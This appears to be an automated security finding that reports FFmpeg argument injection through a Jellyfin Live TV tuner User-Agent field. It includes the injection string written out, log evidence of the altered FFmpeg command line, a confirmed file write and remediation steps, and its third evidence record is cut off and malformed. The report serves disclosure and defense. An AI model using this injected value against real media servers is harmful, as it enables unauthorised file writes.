tests.request: Inject UA, trigger HLS, check FFmpeg cmdline
Inject UA, trigger HLS, check FFmpeg cmdline
Inject UA, trigger HLS, check FFmpeg cmdline

findings.title: FFmpeg argument injection via Live TV tuner User-Agent (VALIDATED 3/3 rounds)
findings.details: Pristine validation confirmed 3 of 3 rounds. The TunerHostInfo.UserAgent field accepts arbitrary values including FFmpeg command-line arguments (quotes, -f, -i, -y flags). These are passed to FFmpeg via string concatenation in EncodingHelper.GetUserAgentParam() (line 495) and MediaEncoder.cs (line 459). The -report flag injection successfully wrote a file to the container filesystem, confirming arbitrary file write capability.
findings.evidence:
[
  {
    "round": 1,
    "tuner_id": "5945cb6e1d704c69af7c60297526217a",
    "channel_id": "24974a1bf50b80ff4e81c72b373532e1",
    "stored_ua": "Mozilla/5.0\" -loglevel verbose -report -i \"",
    "injection_confirmed": true,
    "file_write_confirmed": true,
    "ffmpeg_cmd": "[2026-03-02 23:58:18.522 +00:00] [INF] [76] MediaBrowser.MediaEncoding.Transcoding.TranscodeManager: \"/usr/lib/jellyfin-ffmpeg/ffmpeg\" \"-analyzeduration 200M -probesize 1G -user_agent \\\"Mozilla/5.0\\\" -loglevel verbose -report -i \\\"\\\" -fflags +igndts  -i \\\"http://[REDACTED-INTERNAL-IP]:9999/movies/Test_Movie_2026.mp4\\\" -map_metadata -1 -map_chapters -1 -threads 0 -sn -codec:v:0 libx264 -preset superfast -crf 23 -maxrate 0 -bufsize 0 -x264opts:0 subme=0:me_range=16:rc_lookahead=10:me=hex:open_gop=0 -force_key",
    "status": "CONFIRMED"
  },
  {
    "round": 2,
    "tuner_id": "2321d1fb987d4b849657a4a1a9c0a7b8",
    "channel_id": "24974a1bf50b80ff4e81c72b373532e1",
    "stored_ua": "Mozilla/5.0\" -loglevel verbose -report -i \"",
    "injection_confirmed": true,
    "file_write_confirmed": true,
    "ffmpeg_cmd": "[2026-03-02 23:58:31.028 +00:00] [INF] [73] MediaBrowser.MediaEncoding.Transcoding.TranscodeManager: \"/usr/lib/jellyfin-ffmpeg/ffmpeg\" \"-analyzeduration 200M -probesize 1G -user_agent \\\"Mozilla/5.0\\\" -loglevel verbose -report -i \\\"\\\" -fflags +igndts  -i \\\"http://[REDACTED-INTERNAL-IP]:9999/movies/Test_Movie_2026.mp4\\\" -map_metadata -1 -map_chapters -1 -threads 0 -sn -codec:v:0 libx264 -preset superfast -crf 23 -maxrate 0 -bufsize 0 -x264opts:0 subme=0:me_range=16:rc_lookahead=10:me=hex:open_gop=0 -force_key",
    "status": "CONFIRMED"
  },

    "round": 3,
    "tuner_id": "bd8508840cbc4ae994640088bdf1d188",
    "channel_id": "24974a1bf50b80ff4e81c72b373532e1",
    "stored_ua": "Mozilla/5.0\" -loglevel verbose -report -i \"",

    "ffmpeg_cmd": "[2026-03-02 23:58:43.642 +00:00] [INF] [78] MediaBrowser.MediaEnco
findings.remediation:
1. Sanitize UserAgent values: strip double quotes, reject values containing FFmpeg argument patterns.
2. Use ProcessStartInfo.ArgumentList instead of string concat.
3. Apply the same ContainerValidationRegex to User-Agent/Referer.
